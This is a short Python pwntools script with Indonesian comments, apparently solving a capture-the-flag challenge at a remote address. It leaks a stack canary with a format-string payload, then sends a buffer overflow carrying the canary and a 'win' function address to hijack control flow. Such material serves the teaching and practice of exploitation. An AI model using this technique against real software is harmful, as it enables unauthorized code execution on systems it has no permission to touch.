import pwn

#address fungsi win
WIN_ADDRESS = 0x401290

#buat local connection
# with pwn.process("./chall") as c:

#buat remote connection
with pwn.remote("34.101.174.85",10002) as c:
   #dapetin stack canary-nya
   #tunggu prompt
   print(c.recvuntil("> "))
   #kirim payload
   c.sendline("%11$lx") #cek pake gdb
   #lihat responsenya
   canary_stack = c.recvline().strip().decode()
   print(canary_stack)

   #parse canary
   canary = bytes.fromhex(canary_stack)

   #tunggu prompt lagi
   print(c.recvuntil("> "))
   #kirim payload
   #payload canary
   payload_canary = pwn.p64(int.from_bytes(canary,"big"))
   print("Payload Canary: ",payload_canary)
   #payload win
   win_payload = pwn.p64(WIN_ADDRESS)
   print("Win Payload: ",win_payload)
   c.sendline(b'A'* 40 + payload_canary + b"A"*8 + win_payload )
   #lihat responsenya
   response = c.recvall()
   print(response)